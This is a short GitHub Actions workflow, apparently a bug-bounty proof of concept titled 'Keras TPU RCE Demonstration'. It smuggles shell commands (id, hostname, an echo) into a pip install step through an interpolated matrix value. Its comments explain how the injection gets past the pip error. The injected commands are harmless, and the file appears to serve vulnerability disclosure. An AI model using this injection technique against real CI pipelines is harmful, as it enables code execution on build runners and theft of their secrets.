name: Keras TPU RCE Demonstration
on:
  push:
    branches: [ vrp-rce-test ]

jobs:
  tpu-test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        # We add '|| true' to bypass the pip error and force the shell to continue
        backend: ["jax-tpu.txt || id; hostname; echo '--- VULNERABILITY CONFIRMED ---'; #"]
    steps:
      - uses: actions/checkout@v4
      - name: Install dependencies
        run: |
          # Note: We remove the '-tpu.txt' suffix from the run line to match our payload
          pip install --no-cache-dir -r requirements-${{ matrix.backend }}
